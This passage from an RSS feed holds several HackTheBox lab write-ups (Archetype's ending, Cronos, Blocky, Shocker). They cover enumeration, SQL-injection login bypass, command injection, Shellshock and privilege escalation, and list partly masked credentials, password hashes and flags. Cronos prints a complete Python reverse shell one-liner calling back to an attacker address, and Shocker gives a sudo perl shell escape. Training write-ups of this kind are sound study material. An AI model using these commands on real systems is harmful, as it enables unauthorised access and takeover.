<p>3. We can now read the <code>root.txt</code> flag:  </p>
<pre><code>type C:\Users\Administrator\Desktop\root.txt
</code></pre>
<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_archetype/screenshot13.png.webp" />  </p>
<h2>Loot</h2>
<h3>Credentials</h3>
<pre><code>ssh: administrator/MEGACORP_4......
sql: sql_svc/M3g4c0r....
</code></pre>
<h3>Flags</h3>
<pre><code>C:\Users\sql_svc\Desktop\user.txt: 3e7b102e78218e935bf.............
C:\Users\Administrator\Desktop\root.txt: b91ccec3305e982400..............
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/start">https://www.hackthebox.eu/home/start</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] CronOS</title>
      <link>https://7h3ram.github.io/posts/20191113_htb-cronos.html</link>
      <guid>https://7h3ram.github.io/posts/20191113_htb-cronos.html</guid>
      <pubDate>Wed, 13 Nov 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/11">Cronos</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_cronos/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_cronos/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>80/tcp/http/Apache httpd 2.4.18 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_sqli">exploit_sqli</a>, <a href="https://github.com/7h3rAm/writeups#privesc_cron">privesc_cron</a></p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Wed Nov 13 14:08:01 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.cronos/results/10.10.10.13/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.cronos/results/10.10.10.13/scans/xml/_quick_tcp_nmap.xml 10.10.10.13
Nmap scan report for 10.10.10.13
Host is up, received user-set (0.084s latency).
Scanned at 2019-11-13 14:08:02 PST for 23s
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
|   256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 13 14:08:25 2019 -- 1 IP address (1 host up) scanned in 24.49 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_cronos/openports.png.webp" />  </p>
<p>3. We start with DNS enumeration and with a reverse lookup and find that the subdomain <code>ns1.cronos.htb</code> is associated with the target IP. Since DNS is responding on TCP, we also perform a DNS zone transfer and find additional subdomains associated with the target IP:  </p>
<pre><code>dig +noall +answer -x 10.10.10.13 @10.10.10.13
host -t axfr cronos.htb 10.10.10.13
</code></pre>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_cronos/screenshot01.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_htb_cronos/screenshot02.png.webp" />  </p>
<p>4. Upon visiting the <code>admin.cronos.htb</code> subdomain, we are presented with a login page, that is vulnerable to SQL injection:  </p>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_cronos/screenshot03.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>22/tcp  |  ssh     |  OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
53/tcp  |  domain  |  ISC BIND 9.10.3-P4 (Ubuntu Linux)
80/tcp  |  http    |  Apache httpd 2.4.18 ((Ubuntu))
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We use SQLi to successfully bypass login and are presented with a page that allows running the <code>ping</code> and <code>traceroute</code> commands. The input field on this page is vulnerable to a command injection:  </p>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_cronos/screenshot04.png.webp" />  </p>
<p>2. We use this to execute a Python reverse shell and get interactive access on the target system:  </p>
<pre><code>nc -nlvp 443
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.25&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_cronos/screenshot05.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_cronos/screenshot06.png.webp" />  </p>
<p>3. We obtain the first flag since the file is readable by current user <code>www-data</code>:  </p>
<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_htb_cronos/screenshot07.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>www-data@cronos&gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cronos&gt;  
www-data@cronos&gt; uname
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
www-data@cronos&gt;  
www-data@cronos&gt; ifconfig
ens160  Link encap:Ethernet  HWaddr 00:50:56:b9:26:e7
        inet addr:10.10.10.13  Bcast:10.10.10.255  Mask:255.255.255.0
        inet6 addr: dead:beef::250:56ff:feb9:26e7/64 Scope:Global
        inet6 addr: fe80::250:56ff:feb9:26e7/64 Scope:Link
        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
        RX packets:1008552 errors:0 dropped:0 overruns:0 frame:0
        TX packets:687541 errors:0 dropped:0 overruns:0 carrier:0
        collisions:0 txqueuelen:1000
        RX bytes:157239763 (157.2 MB)  TX bytes:224790718 (224.7 MB)
www-data@cronos&gt;  
www-data@cronos&gt; users
root
noulis
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. While enumerating, we find hardcoded MySQL credentials for user <code>admin</code> within the <code>/var/www/admin/config.php</code> file. We use these credentials to connect to MySQL service and obtain password hash for user <code>admin</code>. We were unable to crack this hash:  </p>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_cronos/screenshot08.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_htb_cronos/screenshot09.png.webp" />  </p>
<p>2. Upon further enumeration, we find that there's a cronjob that run a PHP file every minute with <code>root</code> privileges. Luckily for us, the PHP file it runs is owned by current user <code>www-data</code>:  </p>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_cronos/screenshot10.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_htb_cronos/screenshot11.png.webp" />  </p>
<p>3. We can replace this file with a PHP reverse shell and catch the incoming shell to obtain elevated privileges:  </p>
<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_cronos/screenshot12.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_htb_cronos/screenshot13.png.webp" />  </p>
<p>4. We then view the contents of the <code>root.txt</code> file to complete the challenge:  </p>
<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_htb_cronos/screenshot14.png.webp" />  </p>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>root:$6$L2m6DJwN$p/xas4tCNp19sda4q2ZzGC82Ix7GiEb7xvCbzWCsFHs/eR82G4/YOnni/.L69tpCkOGo5lm0AU7zh9lP5........................
www-data:$6$SYixzIan$P3cvyztSwA1lmILF3kpKcqZpYSDONYwMwplB62RWu1RklKqIGCX1zleXuVwzxjLcpU6bhiW9N03AWkzVU........................
noulis:$6$ApsLg5.I$Zd9blHPGRHAQOab94HKuQFtJ8m7ob8MFnX6WIIr0Aah6pW/aZ.yA3T1iU13lCSixrh6NG1.GHPl.QbjHS........................
</code></pre>
<h3>Credentials</h3>
<pre><code>mysql: admin/kEjdbRigfBHURE.....
</code></pre>
<h3>Flags</h3>
<pre><code>/home/noulis/user.txt: 51d236438b333970dbba7...........
/root/root.txt: 1703b8a3c9a8dde879942c..........
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/11">https://www.hackthebox.eu/home/machines/profile/11</a>  </li>
<li><a href="https://www.youtube.com/watch?v=CYeVUmOar3I">https://www.youtube.com/watch?v=CYeVUmOar3I</a>  </li>
<li><a href="https://medium.com/cronos-htb-walkthough/cronos-htb-walkthrough-9ef91750726">https://medium.com/cronos-htb-walkthough/cronos-htb-walkthrough-9ef91750726</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Blocky</title>
      <link>https://7h3ram.github.io/posts/20191113_htb-blocky.html</link>
      <guid>https://7h3ram.github.io/posts/20191113_htb-blocky.html</guid>
      <pubDate>Wed, 13 Nov 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/48">Blocky</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_blocky/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_blocky/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>80/tcp/http/Apache httpd 2.4.18 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_app_wordpress">enumerate_app_wordpress</a>, <a href="https://github.com/7h3rAm/writeups#exploit_wordpress_plugin">exploit_wordpress_plugin</a>, <a href="https://github.com/7h3rAm/writeups#exploit_credsreuse">exploit_credsreuse</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudoers">privesc_sudoers</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Wed Nov 13 12:25:27 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.blocky/results/10.10.10.37/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.blocky/results/10.10.10.37/scans/xml/_quick_tcp_nmap.xml 10.10.10.37
Nmap scan report for 10.10.10.37
Host is up, received user-set (0.073s latency).
Scanned at 2019-11-13 12:25:28 PST for 18s
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT     STATE  SERVICE REASON         VERSION
21/tcp   open   ftp     syn-ack ttl 63 ProFTPD 1.3.5a
22/tcp   open   ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqVh031OUgTdcXsDwffHKL6T9f1GfJ1/x/b/dywX42sDZ5m1Hz46bKmbnWa0YD3LSRkStJDtyNXptzmEp31Fs2DUndVKui3LCcyKXY6FSVWp9ZDBzlW3aY8qa+y339OS3gp3aq277zYDnnA62U7rIltYp91u5VPBKi3DITVaSgzA8mcpHRr30e3cEGaLCxty58U2/lyCnx3I0Lh5rEbipQ1G7Cr6NMgmGtW6LrlJRQiWA1OK2/tDZbLhwtkjB82pjI/0T2gpA/vlZJH0elbMXW40Et6bOs2oK/V2bVozpoRyoQuts8zcRmCViVs8B3p7T1Qh/Z+7Ki91vgicfy4fl
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgEpgEZGGbtm5suOAio9ut2hOQYLN39Uhni8i4E/Wdir1gHxDCLMoNPQXDOnEUO1QQVbioUUMgFRAXYLhilNF8=
|   256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILqVrP5vDD4MdQ2v3ozqDPxG1XXZOp5VPpVsFUROL6Vj
80/tcp   open   http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &amp;#8211; Under Construction!
8192/tcp closed sophos  reset ttl 63
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 13 12:25:46 2019 -- 1 IP address (1 host up) scanned in 18.38 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_blocky/openports.png.webp" />  </p>
<p>3. We find a Wordpress installation and manually find a username <code>notch</code>. Attempts to login via common default credentials failed:  </p>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_blocky/screenshot01.png.webp" />  </p>
<p>4. We find a <code>plugins</code> directory that lists two <code>jar</code> files. We download those and find hardcoded SQL credentials for user <code>root</code> in the <code>BlockyCore.class</code> file:  </p>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_blocky/screenshot02.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_htb_blocky/screenshot03.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>21/tcp     |  ftp        |  ProFTPD 1.3.5a
22/tcp     |  ssh        |  OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp     |  http       |  Apache httpd 2.4.18 ((Ubuntu))
25565/tcp  |  minecraft  |  Minecraft 1.11.2 (Protocol: 127 Message: A Minecraft Server   Users: 0/20)
</code></pre>
<h4>Files</h4>
<pre><code>http://10.10.10.37/plugins/
</code></pre>
<h4>Users</h4>
<pre><code>wordpress: notch
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We successfully login via FTP as user <code>notch</code> with password found in the <code>BlockCore.class</code> file. We find that the FTP root directory is set to the user <code>notch</code>'s home directory:  </p>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_blocky/screenshot04.png.webp" />  </p>
<p>2. We also successfully gain interactive SSH access using the same credentials as above which gives us access to the first flag file, <code>user.txt</code>:  </p>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_blocky/screenshot05.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_blocky/screenshot06.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>notch@Blocky&gt; id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
notch@Blocky&gt;  
notch@Blocky&gt; uname
Linux Blocky 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
notch@Blocky&gt;  
notch@Blocky&gt; ifconfig
ens160  Link encap:Ethernet  HWaddr 00:50:56:b9:54:bc
        inet addr:10.10.10.37  Bcast:10.10.10.255  Mask:255.255.255.0
        inet6 addr: fe80::250:56ff:feb9:54bc/64 Scope:Link
        inet6 addr: dead:beef::250:56ff:feb9:54bc/64 Scope:Global
        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
        RX packets:490347 errors:0 dropped:0 overruns:0 frame:0
        TX packets:207569 errors:0 dropped:0 overruns:0 carrier:0
        collisions:0 txqueuelen:1000
        RX bytes:42901509 (42.9 MB)  TX bytes:61223429 (61.2 MB)
notch@Blocky&gt;  
notch@Blocky&gt; users
root
notch
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. From the output of the <code>id</code> command and also confirming via <code>sudo -l</code>, we know that the user <code>notch</code> is a member of the <code>sudo</code> group. This means we can switch to <code>root</code> and gain elevated privileges:  </p>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_blocky/screenshot07.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_htb_blocky/screenshot08.png.webp" />  </p>
<p>2. We then read the contents of <code>root.txt</code> file to complete the challenge:  </p>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_blocky/screenshot09.png.webp" />  </p>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>notch:$6$RdxVAN/.$DFugS5p/G9hTNY9htDWVGKte9n9r/nYYL.wVdAHfiHpnyN9dNftf5Nt.DkjrUs0PlYNcYZWhh0Vhl/5tl........................
</code></pre>
<h3>Credentials</h3>
<pre><code>ftp: notch/8YsqfCTnvxAUeduzj......
ssh: notch/8YsqfCTnvxAUeduzj......
</code></pre>
<h3>Flags</h3>
<pre><code>/home/notch/user.txt: 59fee0977fb60b8a0bc6e...........
/root/root.txt: 0a9694a5b4d272c694679f..........
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/48">https://www.hackthebox.eu/home/machines/profile/48</a>  </li>
<li><a href="https://www.youtube.com/watch?v=C2O-rilXA6I">https://www.youtube.com/watch?v=C2O-rilXA6I</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Shocker</title>
      <link>https://7h3ram.github.io/posts/20191113_htb-shocker.html</link>
      <guid>https://7h3ram.github.io/posts/20191113_htb-shocker.html</guid>
      <pubDate>Wed, 13 Nov 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/108">Shocker</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_shocker/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_shocker/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>80/tcp/http/Apache httpd 2.4.18 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_shellshock">exploit_shellshock</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudoers">privesc_sudoers</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Wed Nov 13 16:00:23 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.shocker/results/10.10.10.56/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.shocker/results/10.10.10.56/scans/xml/_quick_tcp_nmap.xml 10.10.10.56
Increasing send delay for 10.10.10.56 from 0 to 5 due to 145 out of 482 dropped probes since last increase.
Nmap scan report for 10.10.10.56
Host is up, received user-set (0.11s latency).
Scanned at 2019-11-13 16:00:24 PST for 25s
Not shown: 998 closed ports
Reason: 998 resets
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 13 16:00:49 2019 -- 1 IP address (1 host up) scanned in 26.24 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_shocker/openports.png.webp" />  </p>
<p>3. We try Shellshock related enumeration steps to identify interesting scripts to be used as entrypoint:  </p>
<pre><code>gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403
gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403 -k -x sh,pl
nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
</code></pre>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_shocker/screenshot01.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_htb_shocker/screenshot02.png.webp" />  </p>
<p>4. The <code>user.sh</code> script looks interesting and we manually confirm that it is vulnerable to Shellshock:  </p>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_shocker/screenshot03.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_htb_shocker/screenshot04.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>80/tcp    |  http  |  Apache httpd 2.4.18 ((Ubuntu))
2222/tcp  |  ssh   |  OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
</code></pre>
<h4>Files</h4>
<pre><code>http://10.10.10.56/cgi-bin/user.sh
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We inject a Bash reverse shell command within the HTTP User-Agent header and get interactive access on the target system:  </p>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_shocker/screenshot05.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_shocker/screenshot06.png.webp" />  </p>
<p>2. We can now view the contents of the first flag file, <code>user.txt</code>:  </p>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_shocker/screenshot07.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>shelly@Shocker&gt; id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
shelly@Shocker&gt;  
shelly@Shocker&gt; uname
Linux Shocker 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
shelly@Shocker&gt;  
shelly@Shocker&gt; ifconfig
ens33 Link encap:Ethernet  HWaddr 00:50:56:b9:fe:2c
      inet addr:10.10.10.56  Bcast:10.10.10.255  Mask:255.255.255.0
      inet6 addr: fe80::250:56ff:feb9:fe2c/64 Scope:Link
      inet6 addr: dead:beef::250:56ff:feb9:fe2c/64 Scope:Global
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:769099 errors:0 dropped:0 overruns:0 frame:0
      TX packets:542509 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000
      RX bytes:65025189 (65.0 MB)  TX bytes:92873202 (92.8 MB)
shelly@Shocker&gt;  
shelly@Shocker&gt; users
root
shelly
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. From the output of the <code>sudo -l</code>, we know that the user <code>shelly</code> can execute <code>perl</code> with <code>sudo</code> privileges. We use this to execute Bash and get elevated privileges:  </p>
<pre><code>sudo -l
sudo perl -e 'exec &quot;/bin/sh&quot;;'
</code></pre>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_shocker/screenshot08.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_htb_shocker/screenshot09.png.webp" />  </p>
<p>2. We then view the contents of the <code>root.txt</code> file to complete the challenge:  </p>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_shocker/screenshot10.png.webp" />  </p>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>root:$6$BVgS5ne0$Q6rV3guK7QQUy7uRMwbQ3vv2Y5I9yQUhIzvrIhuiDso/o5UfDxZw7MMq8atR3UdJjhpkFVxVD0cVtjXQd........................
shelly:$6$aYLAoDIC$CJ8f8WSCT6GYmbx7x8z5RfrbTG5mpDkkJkLW097hoiEw3tqei2cE7EcUTYdJTVMSa3PALZeBHjhiFR8Ba........................
</code></pre>
<h3>Flags</h3>
<pre><code>/home/shelly/user.txt: 2ec24e11320026d1e70ff...........
/root/root.txt: 52c2715605d70c76190305..........
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/108">https://www.hackthebox.eu/home/machines/profile/108</a>  </li>
<li><a href="https://www.youtube.com/watch?v=IBlTdguhgfY">https://www.youtube.com/watch?v=IBlTdguhgfY</a>  </li>
<li><a href="https://xd3m0n.xyz/htb_shocker/">https://xd3m0n.xyz/htb_shocker/</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Mirai</title>
      <link>https://7h3ram.github.io/posts/20191112_htb-mirai.html</link>
      <guid>https://7h3ram.github.io/posts/20191112_htb-mirai.html</guid>
      <pubDate>Tue, 12 Nov 2019 00:00:00 +0000</pubDate>
